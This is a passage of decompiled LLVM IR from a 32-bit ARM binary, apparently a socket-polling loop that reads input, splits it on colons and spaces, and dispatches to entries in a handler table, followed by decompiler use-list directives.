  %v0_c1f8 = call i32 @function_f2e0()
  %v0_c200 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19398.221 to i32), i32* @r1, align 4
  store i32 %v0_c1f8, i32* %r2.global-to-local, align 4
  %v4_c20c = call i32 @function_f560(i32 %v0_c200, i32 ptrtoint ([6 x i8]* @global_var_19398.221 to i32), i32 %v0_c1f8)
  br label %dec_label_pc_c28c

dec_label_pc_c21c:                                ; preds = %dec_label_pc_c28c
  %v3_c220 = mul i32 %storemerge12, 4
  store i32 %v3_c220, i32* %r2.global-to-local, align 4
  %v4_c234 = load i32, i32* %v4_c1b0, align 4
  %v2_c238 = add i32 %v4_c234, %v3_c220
  %v1_c23c = inttoptr i32 %v2_c238 to i32*
  %v2_c23c = load i32, i32* %v1_c23c, align 4
  store i32 %v2_c23c, i32* @r4, align 4
  store i32 %v3_c220, i32* %r2.global-to-local, align 4
  %v4_c258 = load i32, i32* %v4_c1b0, align 4
  %v2_c25c = add i32 %v4_c258, %v3_c220
  %v1_c260 = inttoptr i32 %v2_c25c to i32*
  %v2_c260 = load i32, i32* %v1_c260, align 4
  store i32 %v2_c260, i32* @r0, align 4
  %v0_c268 = call i32 @function_f2e0()
  %v0_c270 = load i32, i32* @r4, align 4
  store i32 %v0_c268, i32* @r2, align 4
  %v2_c27c = inttoptr i32 %v0_c270 to i8*
  %v3_c27c = call i32 @function_f240(i8* %v2_c27c, i32 0)
  %v1_c284 = add nuw i32 %storemerge12, 1
  br label %dec_label_pc_c28c

dec_label_pc_c28c:                                ; preds = %dec_label_pc_c1cc, %dec_label_pc_c21c
  %storemerge12 = phi i32 [ 1, %dec_label_pc_c1cc ], [ %v1_c284, %dec_label_pc_c21c ]
  store i32 %storemerge12, i32* %r2.global-to-local, align 4
  %v5_c2a4 = icmp slt i32 %storemerge12, %arg1
  br i1 %v5_c2a4, label %dec_label_pc_c21c, label %dec_label_pc_c2a8

dec_label_pc_c2a8:                                ; preds = %dec_label_pc_c28c
  %v2_c2ac = call i32 @function_cbf4(i32* null)
  store i32 %v2_c2ac, i32* @r0, align 4
  %v0_c2b4 = call i32 @function_cbe0()
  store i32 %v0_c2b4, i32* @r0, align 4
  %v2_c2bc = xor i32 %v2_c2ac, %v0_c2b4
  store i32 %v2_c2bc, i32* @r4, align 4
  %v0_c2c0 = call i32 @function_cbcc()
  %v0_c2c8 = load i32, i32* @r4, align 4
  %v2_c2c8 = add i32 %v0_c2c8, %v0_c2c0
  %v1_c2d0 = call i32 @function_10ebc(i32 %v2_c2c8)
  %v0_c2d4 = call i32 @function_86b4()
  store i32 %v0_c2d4, i32* %r2.global-to-local, align 4
  store i32 %v0_c2d4, i32* @global_var_25604.175, align 4
  %v0_c2e4 = call i32 @function_86b4()
  store i32 %v0_c2e4, i32* %r2.global-to-local, align 4
  store i32 %v0_c2e4, i32* @global_var_25600.29, align 4
  %v0_c2f4 = call i32 @function_86b4()
  store i32 %v0_c2f4, i32* @global_var_2560c.225, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_193a0.228 to i32), i32* @global_var_25718.173, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_193a8.231 to i32), i32* @global_var_25714.197, align 4
  store i32 ptrtoint (i32* @global_var_25710.130 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_25710.130, align 4
  %v2_c364 = ptrtoint i32* %stack_var_-460 to i32
  %v2_c424 = ptrtoint i32* %stack_var_-332 to i32
  %v2_c63c = ptrtoint i32* %stack_var_-6604 to i32
  %v2_c738 = ptrtoint i32* %stack_var_-2508 to i32
  %v2_c744 = bitcast i32* %stack_var_-2508 to i8*
  %v2_c7f4 = ptrtoint i32* %stack_var_-1484 to i32
  %v3_c800 = bitcast i32* %stack_var_-1484 to i8*
  br label %dec_label_pc_c328

dec_label_pc_c328:                                ; preds = %dec_label_pc_c62c, %dec_label_pc_c3a0, %dec_label_pc_c8c4, %dec_label_pc_c2a8
  %v0_c328 = call i32 @function_be84()
  %v2_c330 = load i32, i32* @global_var_25608.10, align 4
  %v2_c338 = load i32, i32* @global_var_25604.175, align 4
  %v2_c340 = load i32, i32* @global_var_25600.29, align 4
  store i32 %v2_c340, i32* @lr, align 4
  store i32 %v2_c338, i32* @r2, align 4
  %v3_c360 = call i32 @function_8398(i32 %v2_c330, i32 ptrtoint ([41 x i8]* @global_var_193b0.235 to i32))
  br label %dec_label_pc_c378.lr.ph

dec_label_pc_c378.lr.ph:                          ; preds = %dec_label_pc_c5e4, %dec_label_pc_c668, %dec_label_pc_c8e8, %dec_label_pc_c908, %dec_label_pc_c328
  br label %dec_label_pc_c378

dec_label_pc_c378:                                ; preds = %dec_label_pc_c378.lr.ph, %dec_label_pc_c378
  %storemerge1327 = phi i32 [ 0, %dec_label_pc_c378.lr.ph ], [ %v1_c38c, %dec_label_pc_c378 ]
  store i32 %v2_c364, i32* %r2.global-to-local, align 4
  %v5_c384 = mul nuw nsw i32 %storemerge1327, 4
  %v6_c384 = add i32 %v5_c384, %v2_c364
  %v7_c384 = inttoptr i32 %v6_c384 to i32*
  store i32 0, i32* %v7_c384, align 4
  %v1_c38c = add nuw nsw i32 %storemerge1327, 1
  %tmp64 = icmp ult i32 %v1_c38c, 32
  br i1 %tmp64, label %dec_label_pc_c378, label %dec_label_pc_c3a0

dec_label_pc_c3a0:                                ; preds = %dec_label_pc_c378
  %v2_c3a4 = load i32, i32* @global_var_25608.10, align 4
  %v3_c3a8 = udiv i32 %v2_c3a4, 32
  %v3_c3bc = mul nuw nsw i32 %v3_c3a8, 4
  %v2_c3c4 = add i32 %v3_c3bc, %v2_c19c
  store i32 %v2_c3c4, i32* %r2.global-to-local, align 4
  %v2_c3c8 = add i32 %v2_c3c4, -436
  %v1_c3cc = inttoptr i32 %v2_c3c8 to i32*
  %v2_c3cc = load i32, i32* %v1_c3cc, align 4
  %v1_c3d8 = urem i32 %v2_c3a4, 32
  %v6_c3e0 = shl i32 1, %v1_c3d8
  %v2_c3e4 = or i32 %v2_c3cc, %v6_c3e0
  store i32 %v2_c3e4, i32* %v1_c3cc, align 4
  store i32 1200, i32* %stack_var_-332, align 4
  %v2_c418 = load i32, i32* @global_var_25608.10, align 4
  %v1_c41c = add i32 %v2_c418, 1
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_c438 = call i32 @function_cc74(i32 %v1_c41c, i32 %v2_c364, i32 0, i32 0, i32 %v2_c424)
  %tmp65 = icmp slt i32 %v5_c438, 1
  br i1 %tmp65, label %dec_label_pc_c328, label %dec_label_pc_c5d0.preheader

dec_label_pc_c5d0.preheader:                      ; preds = %dec_label_pc_c3a0
  %v2_c5d495 = load i32, i32* @global_var_22eb0.14, align 4
  store i32 %v2_c5d495, i32* %r2.global-to-local, align 4
  %v3_c5dc97 = icmp eq i32 %v2_c5d495, 0
  br i1 %v3_c5dc97, label %dec_label_pc_c5e4, label %dec_label_pc_c454

dec_label_pc_c454:                                ; preds = %dec_label_pc_c5c4, %dec_label_pc_c5d0.preheader
  %storemerge14104 = phi i32 [ %.pre122, %dec_label_pc_c5c4 ], [ 0, %dec_label_pc_c5d0.preheader ]
  %v3_c458 = mul i32 %storemerge14104, 4
  store i32 %v3_c458, i32* %r2.global-to-local, align 4
  %v2_c464 = load i32, i32* @global_var_2571c.16, align 4
  %v2_c468 = add i32 %v2_c464, %v3_c458
  %v1_c46c = inttoptr i32 %v2_c468 to i32*
  %v2_c46c = load i32, i32* %v1_c46c, align 4
  store i32 %v2_c46c, i32* @r0, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v3_c47c = call i32 @function_cc58(i32 %v2_c46c, i32 0, i32 1)
  %tmp66 = icmp slt i32 %v3_c47c, 1
  %.pre122 = add i32 %storemerge14104, 1
  br i1 %tmp66, label %dec_label_pc_c5c4, label %dec_label_pc_c4e0.preheader

dec_label_pc_c4e0.preheader:                      ; preds = %dec_label_pc_c454
  %v2_c4e474 = load i32, i32* @global_var_22eb0.14, align 4
  %v3_c4ec76 = icmp ult i32 %.pre122, %v2_c4e474
  %v2_c4f877 = load i32, i32* @global_var_2571c.16, align 4
  %v1_c4fc78 = add i32 %v2_c4f877, -4
  store i32 %v1_c4fc78, i32* %r2.global-to-local, align 4
  %v3_c50479 = mul i32 %.pre122, 4
  %v2_c50880 = add i32 %v1_c4fc78, %v3_c50479
  br i1 %v3_c4ec76, label %dec_label_pc_c49c, label %dec_label_pc_c4f4

dec_label_pc_c49c:                                ; preds = %dec_label_pc_c4e0.preheader, %dec_label_pc_c49c
  %v2_c50884 = phi i32 [ %v2_c508, %dec_label_pc_c49c ], [ %v2_c50880, %dec_label_pc_c4e0.preheader ]
  %v3_c50483 = phi i32 [ %v3_c504, %dec_label_pc_c49c ], [ %v3_c50479, %dec_label_pc_c4e0.preheader ]
  %v2_c4f882 = phi i32 [ %v2_c4f8, %dec_label_pc_c49c ], [ %v2_c4f877, %dec_label_pc_c4e0.preheader ]
  %v1_c49081 = phi i32 [ %v1_c490, %dec_label_pc_c49c ], [ %.pre122, %dec_label_pc_c4e0.preheader ]
  store i32 %v3_c50483, i32* %r2.global-to-local, align 4
  %v2_c4c8 = add i32 %v2_c4f882, %v3_c50483
  %v1_c4cc = inttoptr i32 %v2_c4c8 to i32*
  %v2_c4cc = load i32, i32* %v1_c4cc, align 4
  %v2_c4d0 = inttoptr i32 %v2_c50884 to i32*
  store i32 %v2_c4cc, i32* %v2_c4d0, align 4
  %v1_c490 = add i32 %v1_c49081, 1
  %v2_c4e4 = load i32, i32* @global_var_22eb0.14, align 4
  %v3_c4ec = icmp ult i32 %v1_c490, %v2_c4e4
  %v2_c4f8 = load i32, i32* @global_var_2571c.16, align 4
  %v1_c4fc = add i32 %v2_c4f8, -4
  store i32 %v1_c4fc, i32* %r2.global-to-local, align 4
  %v3_c504 = mul i32 %v1_c490, 4
  %v2_c508 = add i32 %v1_c4fc, %v3_c504
  br i1 %v3_c4ec, label %dec_label_pc_c49c, label %dec_label_pc_c4e0.dec_label_pc_c4f4_crit_edge

dec_label_pc_c4e0.dec_label_pc_c4f4_crit_edge:    ; preds = %dec_label_pc_c49c
  br label %dec_label_pc_c4f4

dec_label_pc_c4f4:                                ; preds = %dec_label_pc_c4e0.dec_label_pc_c4f4_crit_edge, %dec_label_pc_c4e0.preheader
  %v2_c508.lcssa = phi i32 [ %v2_c508, %dec_label_pc_c4e0.dec_label_pc_c4f4_crit_edge ], [ %v2_c50880, %dec_label_pc_c4e0.preheader ]
  %v2_c510 = inttoptr i32 %v2_c508.lcssa to i32*
  store i32 0, i32* %v2_c510, align 4
  %v2_c518 = load i32, i32* @global_var_22eb0.14, align 4
  %v1_c51c = add i32 %v2_c518, -1
  store i32 %v1_c51c, i32* %r2.global-to-local, align 4
  store i32 %v1_c51c, i32* @global_var_22eb0.14, align 4
  %v3_c534 = mul i32 %v2_c518, 4
  %v1_c53c = call i32 @function_fd60(i32 %v3_c534)
  %v2_c59888 = load i32, i32* @global_var_22eb0.14, align 4
  store i32 %v2_c59888, i32* %r2.global-to-local, align 4
  %v3_c5a090 = icmp eq i32 %v2_c59888, 0
  br i1 %v3_c5a090, label %dec_label_pc_c5a8, label %dec_label_pc_c554

dec_label_pc_c554:                                ; preds = %dec_label_pc_c4f4, %dec_label_pc_c554
  %storemerge1691 = phi i32 [ %v1_c58c, %dec_label_pc_c554 ], [ 0, %dec_label_pc_c4f4 ]
  %v3_c558 = mul i32 %storemerge1691, 4
  %v2_c564 = add i32 %v3_c558, %v1_c53c
  store i32 %v3_c558, i32* %r2.global-to-local, align 4
  %v2_c578 = load i32, i32* @global_var_2571c.16, align 4
  %v2_c57c = add i32 %v2_c578, %v3_c558
  %v1_c580 = inttoptr i32 %v2_c57c to i32*
  %v2_c580 = load i32, i32* %v1_c580, align 4
  %v2_c584 = inttoptr i32 %v2_c564 to i32*
  store i32 %v2_c580, i32* %v2_c584, align 4
  %v1_c58c = add i32 %storemerge1691, 1
  %v2_c598 = load i32, i32* @global_var_22eb0.14, align 4
  store i32 %v2_c598, i32* %r2.global-to-local, align 4
  %v3_c5a0 = icmp ult i32 %v1_c58c, %v2_c598
  br i1 %v3_c5a0, label %dec_label_pc_c554, label %dec_label_pc_c594.dec_label_pc_c5a8_crit_edge

dec_label_pc_c594.dec_label_pc_c5a8_crit_edge:    ; preds = %dec_label_pc_c554
  br label %dec_label_pc_c5a8

dec_label_pc_c5a8:                                ; preds = %dec_label_pc_c4f4, %dec_label_pc_c594.dec_label_pc_c5a8_crit_edge
  %v2_c5ac = load i32, i32* @global_var_2571c.16, align 4
  store i32 %v2_c5ac, i32* @r0, align 4
  %v0_c5b4 = call i32 @function_108e4()
  store i32 ptrtoint (i32* @global_var_2571c.16 to i32), i32* %r2.global-to-local, align 4
  store i32 %v1_c53c, i32* @global_var_2571c.16, align 4
  br label %dec_label_pc_c5c4

dec_label_pc_c5c4:                                ; preds = %dec_label_pc_c454, %dec_label_pc_c5a8
  %v2_c5d4 = load i32, i32* @global_var_22eb0.14, align 4
  store i32 %v2_c5d4, i32* %r2.global-to-local, align 4
  %v3_c5dc = icmp ult i32 %.pre122, %v2_c5d4
  br i1 %v3_c5dc, label %dec_label_pc_c454, label %dec_label_pc_c5e4

dec_label_pc_c5e4:                                ; preds = %dec_label_pc_c5c4, %dec_label_pc_c5d0.preheader
  %v2_c5e8 = load i32, i32* @global_var_25608.10, align 4
  %v3_c5ec = udiv i32 %v2_c5e8, 32
  %v3_c5f8 = mul nuw nsw i32 %v3_c5ec, 4
  %v2_c600 = add i32 %v3_c5f8, %v2_c19c
  store i32 %v2_c600, i32* %r2.global-to-local, align 4
  %v2_c604 = add i32 %v2_c600, -436
  %v1_c608 = inttoptr i32 %v2_c604 to i32*
  %v2_c608 = load i32, i32* %v1_c608, align 4
  store i32 %v2_c608, i32* %r2.global-to-local, align 4
  %v1_c614 = urem i32 %v2_c5e8, 32
  %v6_c6182 = lshr i32 %v2_c608, %v1_c614
  %v1_c620 = urem i32 %v6_c6182, 2
  %v2_c624 = icmp eq i32 %v1_c620, 0
  br i1 %v2_c624, label %dec_label_pc_c378.lr.ph, label %dec_label_pc_c62c

dec_label_pc_c62c:                                ; preds = %dec_label_pc_c5e4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_c650 = call i32 @function_fbd8(i32 %v2_c5e8, i32 %v2_c63c, i32 4096, i32 0)
  %tmp67 = icmp slt i32 %v4_c650, 1
  br i1 %tmp67, label %dec_label_pc_c328, label %dec_label_pc_c668

dec_label_pc_c668:                                ; preds = %dec_label_pc_c62c
  %v2_c67c = add i32 %v4_c650, %v2_c63c
  %v3_c67c = inttoptr i32 %v2_c67c to i8*
  store i32 %v2_c67c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v3_c67c, align 1
  store i32 ptrtoint (i32* @global_var_193dc.239 to i32), i32* @r1, align 4
  %v6_c69c = call i32 @function_f634(i32 %v2_c63c, i32 ptrtoint (i32* @global_var_193dc.239 to i32), i32 %v2_c67c, i32 %v2_c63c, i32 %v4_c650)
  %v2_c90030 = icmp eq i32 %v6_c69c, 0
  br i1 %v2_c90030, label %dec_label_pc_c378.lr.ph, label %dec_label_pc_c908

dec_label_pc_c6ac:                                ; preds = %dec_label_pc_c908
  %v2_c6b0 = call i32 @function_8628(i32 %storemerge32.in)
  %v2_c6b8 = load i8, i8* %storemerge32, align 1
  %v7_c6bc = icmp eq i8 %v2_c6b8, 58
  br i1 %v7_c6bc, label %dec_label_pc_c6dc, label %dec_label_pc_c76c

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6f4
  %v1_c6d4 = add i32 %storemerge21, 1
  br label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c6ac, %dec_label_pc_c6d0
  %storemerge21 = phi i32 [ %v1_c6d4, %dec_label_pc_c6d0 ], [ 0, %dec_label_pc_c6ac ]
  store i32 %storemerge32.in, i32* @r0, align 4
  %v0_c6e4 = call i32 @function_f2e0()
  %v3_c6ec = icmp ult i32 %storemerge21, %v0_c6e4
  br i1 %v3_c6ec, label %dec_label_pc_c6f4, label %dec_label_pc_c6dc.dec_label_pc_c710_crit_edge

dec_label_pc_c6dc.dec_label_pc_c710_crit_edge:    ; preds = %dec_label_pc_c6dc
  %.pre = add i32 %storemerge21, %storemerge32.in
  %.pre33 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_c710

dec_label_pc_c6f4:                                ; preds = %dec_label_pc_c6dc
  store i32 %storemerge21, i32* %r2.global-to-local, align 4
  %v2_c700 = add i32 %storemerge21, %storemerge32.in
  %v1_c704 = inttoptr i32 %v2_c700 to i8*
  %v2_c704 = load i8, i8* %v1_c704, align 1
  %v7_c708 = icmp eq i8 %v2_c704, 32
  br i1 %v7_c708, label %dec_label_pc_c710, label %dec_label_pc_c6d0

dec_label_pc_c710:                                ; preds = %dec_label_pc_c6f4, %dec_label_pc_c6dc.dec_label_pc_c710_crit_edge
  %v3_c724.pre-phi = phi i8* [ %.pre33, %dec_label_pc_c6dc.dec_label_pc_c710_crit_edge ], [ %v1_c704, %dec_label_pc_c6f4 ]
  %v2_c71c.pre-phi = phi i32 [ %.pre, %dec_label_pc_c6dc.dec_label_pc_c710_crit_edge ], [ %v2_c700, %dec_label_pc_c6f4 ]
  store i8 0, i8* %v3_c724.pre-phi, align 1
  %v1_c72c = add i32 %storemerge32.in, 1
  store i32 %v1_c72c, i32* %r2.global-to-local, align 4
  store i32 %v1_c72c, i32* @r1, align 4
  %v3_c744 = call i32 @function_f53c(i8* %v2_c744, i32 %v1_c72c)
  store i32 %storemerge21, i32* %r2.global-to-local, align 4
  %v1_c758 = add i32 %v2_c71c.pre-phi, 1
  store i32 %v1_c758, i32* @r1, align 4
  %v4_c764 = call i32 @function_f53c(i8* %storemerge32, i32 %v1_c758)
  br label %dec_label_pc_c788

dec_label_pc_c76c:                                ; preds = %dec_label_pc_c6ac
  store i32 %v2_c738, i32* @r3, align 4
  store i32 %v2_c738, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_193e0.241 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  %v0_c784 = call i32 @function_f350()
  br label %dec_label_pc_c788

dec_label_pc_c788:                                ; preds = %dec_label_pc_c710, %dec_label_pc_c76c
  br label %dec_label_pc_c7a0

dec_label_pc_c794:                                ; preds = %dec_label_pc_c7b8
  %v1_c798 = add i32 %storemerge18, 1
  br label %dec_label_pc_c7a0

dec_label_pc_c7a0:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c794
  %storemerge18 = phi i32 [ 0, %dec_label_pc_c788 ], [ %v1_c798, %dec_label_pc_c794 ]
  store i32 %storemerge18, i32* @r4, align 4
  store i32 %storemerge32.in, i32* @r0, align 4
  %v0_c7a8 = call i32 @function_f2e0()
  %v0_c7b0 = load i32, i32* @r4, align 4
  %v3_c7b0 = icmp ult i32 %v0_c7b0, %v0_c7a8
  br i1 %v3_c7b0, label %dec_label_pc_c7b8, label %dec_label_pc_c7a0.dec_label_pc_c7d4_crit_edge

dec_label_pc_c7a0.dec_label_pc_c7d4_crit_edge:    ; preds = %dec_label_pc_c7a0
  %.pre34 = add i32 %storemerge18, %storemerge32.in
  %.pre35 = inttoptr i32 %.pre34 to i8*
  br label %dec_label_pc_c7d4

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c7a0
  store i32 %storemerge18, i32* %r2.global-to-local, align 4
  %v2_c7c4 = add i32 %storemerge18, %storemerge32.in
  %v1_c7c8 = inttoptr i32 %v2_c7c4 to i8*
  %v2_c7c8 = load i8, i8* %v1_c7c8, align 1
  %v7_c7cc = icmp eq i8 %v2_c7c8, 32
  br i1 %v7_c7cc, label %dec_label_pc_c7d4, label %dec_label_pc_c794

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c7b8, %dec_label_pc_c7a0.dec_label_pc_c7d4_crit_edge
  %v3_c7e8.pre-phi = phi i8* [ %.pre35, %dec_label_pc_c7a0.dec_label_pc_c7d4_crit_edge ], [ %v1_c7c8, %dec_label_pc_c7b8 ]
  %v2_c7e0.pre-phi = phi i32 [ %.pre34, %dec_label_pc_c7a0.dec_label_pc_c7d4_crit_edge ], [ %v2_c7c4, %dec_label_pc_c7b8 ]
  store i32 %v2_c7e0.pre-phi, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v3_c7e8.pre-phi, align 1
  store i32 %storemerge32.in, i32* @r1, align 4
  %v4_c800 = call i32 @function_f53c(i8* %v3_c800, i32 %storemerge32.in)
  store i32 %storemerge18, i32* %r2.global-to-local, align 4
  %v1_c814 = add i32 %v2_c7e0.pre-phi, 1
  store i32 %v1_c814, i32* @r1, align 4
  %v4_c820 = call i32 @function_f53c(i8* %storemerge32, i32 %v1_c814)
  store i32 142312, i32* %r2.global-to-local, align 4
  %v7_c8b8105 = load i32, i32* inttoptr (i32 142312 to i32*), align 8
  %v2_c8bc107 = icmp eq i32 %v7_c8b8105, 0
  br i1 %v2_c8bc107, label %dec_label_pc_c8c4, label %dec_label_pc_c830

dec_label_pc_c830:                                ; preds = %dec_label_pc_c7d4, %dec_label_pc_c830
  %v6_c8b8110 = phi i32* [ %v6_c8b8, %dec_label_pc_c830 ], [ inttoptr (i32 142312 to i32*), %dec_label_pc_c7d4 ]
  %storemerge19108 = phi i32 [ %v1_c8a8, %dec_label_pc_c830 ], [ 0, %dec_label_pc_c7d4 ]
  store i32 %storemerge19108, i32* %r2.global-to-local, align 4
  %v7_c838 = load i32, i32* %v6_c8b8110, align 8
  store i32 %v7_c838, i32* %r2.global-to-local, align 4
  %v2_c850 = inttoptr i32 %v7_c838 to i8*
  %v3_c850 = call i32 @function_f664(i8* %v2_c850, i32 %v2_c7f4)
  store i32 142312, i32* %r2.global-to-local, align 4
  %v3_c86c = mul i32 %storemerge19108, 8
  %v2_c874 = add i32 %v3_c86c, 142316
  %v1_c878 = inttoptr i32 %v2_c874 to i32*
  %v2_c878 = load i32, i32* %v1_c878, align 4
  store i32 %storemerge32.in, i32* %r2.global-to-local, align 4
  store i32 51364, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_c878)
  %v1_c8a8 = add i32 %storemerge19108, 1
  store i32 142312, i32* %r2.global-to-local, align 4
  %v4_c8b8 = mul i32 %v1_c8a8, 8
  %v5_c8b8 = add i32 %v4_c8b8, 142312
  %v6_c8b8 = inttoptr i32 %v5_c8b8 to i32*
  %v7_c8b8 = load i32, i32* %v6_c8b8, align 8
  %v2_c8bc = icmp eq i32 %v7_c8b8, 0
  br i1 %v2_c8bc, label %dec_label_pc_c8c4, label %dec_label_pc_c830

dec_label_pc_c8c4:                                ; preds = %dec_label_pc_c830, %dec_label_pc_c7d4
  %v4_c8d8 = call i32 @function_f664(i8* %v3_c800, i32 ptrtoint ([6 x i8]* @global_var_193e4.244 to i32))
  %v2_c8e0 = icmp eq i32 %v4_c8d8, 0
  br i1 %v2_c8e0, label %dec_label_pc_c328, label %dec_label_pc_c8e8

dec_label_pc_c8e8:                                ; preds = %dec_label_pc_c8c4
  store i32 ptrtoint (i32* @global_var_193dc.239 to i32), i32* @r1, align 4
  %v5_c8f0 = call i32 @function_f634(i32 0, i32 ptrtoint (i32* @global_var_193dc.239 to i32), i32 142312, i32 %v4_c8d8, i32 ptrtoint (i32* @0 to i32))
  %v2_c900 = icmp eq i32 %v5_c8f0, 0
  br i1 %v2_c900, label %dec_label_pc_c378.lr.ph, label %dec_label_pc_c908

dec_label_pc_c908:                                ; preds = %dec_label_pc_c668, %dec_label_pc_c8e8
  %storemerge32.in = phi i32 [ %v5_c8f0, %dec_label_pc_c8e8 ], [ %v6_c69c, %dec_label_pc_c668 ]
  %storemerge32 = inttoptr i32 %storemerge32.in to i8*
  %v2_c90c = load i8, i8* %storemerge32, align 1
  %v2_c910 = icmp eq i8 %v2_c90c, 0
  br i1 %v2_c910, label %dec_label_pc_c378.lr.ph, label %dec_label_pc_c6ac

; uselistorder directives
  uselistorder i8* %storemerge32, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge32.in, { 11, 10, 5, 3, 2, 4, 9, 1, 0, 8, 7, 6 }
  uselistorder i32* %v6_c8b8, { 1, 0 }
  uselistorder i32 %v1_c8a8, { 1, 0 }
  uselistorder i32 %storemerge19108, { 2, 0, 1 }
  uselistorder i32 %v2_c7e0.pre-phi, { 1, 0 }
  uselistorder i32 %.pre34, { 1, 0 }
  uselistorder i32 %storemerge18, { 0, 2, 4, 1, 5, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge21, { 1, 3, 5, 2, 0, 4 }
  uselistorder i32 %v2_c67c, { 0, 2, 1 }
  uselistorder i32 %v4_c650, { 1, 0, 2 }
  uselistorder i32 %v2_c5e8, { 2, 1, 0 }
  uselistorder i32 %v1_c58c, { 1, 0 }
  uselistorder i32 %v3_c558, { 2, 0, 1 }
  uselistorder i32 %storemerge1691, { 1, 0 }
  uselistorder i32 %v1_c53c, { 1, 0 }
  uselistorder i32 %v2_c508, { 1, 0 }
  uselistorder i32 %v2_c4f8, { 1, 0 }
  uselistorder i32 %v1_c490, { 0, 2, 1 }
  uselistorder i32 %v3_c50483, { 1, 0 }
  uselistorder i32 %v2_c50880, { 1, 0 }
  uselistorder i32 %v3_c50479, { 1, 0 }
  uselistorder i32 %.pre122, { 1, 4, 0, 3, 2 }
  uselistorder i32 %v3_c458, { 1, 0 }
  uselistorder i32 %storemerge14104, { 1, 0 }
  uselistorder i32 %v2_c3a4, { 1, 0 }
  uselistorder i32 %storemerge1327, { 1, 0 }
  uselistorder i32 %v2_c738, { 1, 0 }
  uselistorder i32 %v2_c63c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_c364, { 2, 0, 1 }
  uselistorder i32 %storemerge12, { 2, 3, 0, 1 }
  uselistorder i32 %v3_c220, { 3, 1, 2, 0 }
  uselistorder i32 %v2_c19c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 6, 2, 3, 4, 5, 39, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 25, 17, 19, 18, 40, 20, 21, 22, 42, 23, 24, 41, 26, 27, 28, 29, 30, 31, 34, 32, 33, 35, 36, 37, 38, 0, 1 }
  uselistorder i32 142312, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32 (i32)* @function_8628, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_f634, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_193dc.239 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_2571c.16, { 1, 11, 3, 4, 5, 0, 6, 7, 8, 2, 9, 10 }
  uselistorder i32* @global_var_22eb0.14, { 7, 8, 1, 5, 9, 10, 2, 0, 11, 3, 12, 4, 6, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_cc74, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8398, { 64, 63, 62, 61, 60, 59, 5, 6, 4, 3, 2, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 1, 7 }
  uselistorder i32* @global_var_25608.10, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14 }
  uselistorder i32* @global_var_25710.130, { 0, 9, 1, 5, 2, 6, 7, 8, 3, 4 }
  uselistorder i32* @global_var_25600.29, { 1, 0 }
  uselistorder i32* @global_var_25604.175, { 3, 0, 1, 4, 5, 2, 6, 7, 8, 9, 10 }
  uselistorder i32 ()* @function_86b4, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_10ebc, { 1, 0 }
  uselistorder i32 (i32)* @function_cc24, { 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_c908, { 1, 0 }
  uselistorder label %dec_label_pc_c830, { 1, 0 }
  uselistorder label %dec_label_pc_c7a0, { 1, 0 }
  uselistorder label %dec_label_pc_c788, { 1, 0 }
  uselistorder label %dec_label_pc_c6dc, { 1, 0 }
  uselistorder label %dec_label_pc_c5c4, { 1, 0 }
  uselistorder label %dec_label_pc_c5a8, { 1, 0 }
  uselistorder label %dec_label_pc_c554, { 1, 0 }
  uselistorder label %dec_label_pc_c49c, { 1, 0 }
  uselistorder label %dec_label_pc_c378, { 1, 0 }
  uselistorder label %dec_label_pc_c378.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_c328, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_c28c, { 1, 0 }
  uselistorder label %dec_label_pc_c1cc, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
}

define i32 @function_c960() local_unnamed_addr {
dec_label_pc_c960:
  %r2.global-to-local = alloca i32, align 4
  %v0_c960 = load i32, i32* @r1, align 4
  %v1_c960 = add i32 %v0_c960, -1
  store i32 %v1_c960, i32* %r2.global-to-local, align 4
  %v2_c960 = icmp eq i32 %v0_c960, 0
  %v7_c960 = icmp eq i32 %v0_c960, 1
  %v0_c964 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_c960, i32 %v0_c964)
  br i1 %v2_c960, label %dec_label_pc_ca48, label %dec_label_pc_c96c

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c960
  %v0_c96c = load i32, i32* @r0, align 4
  %v1_c96c = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_c96c, %v1_c96c
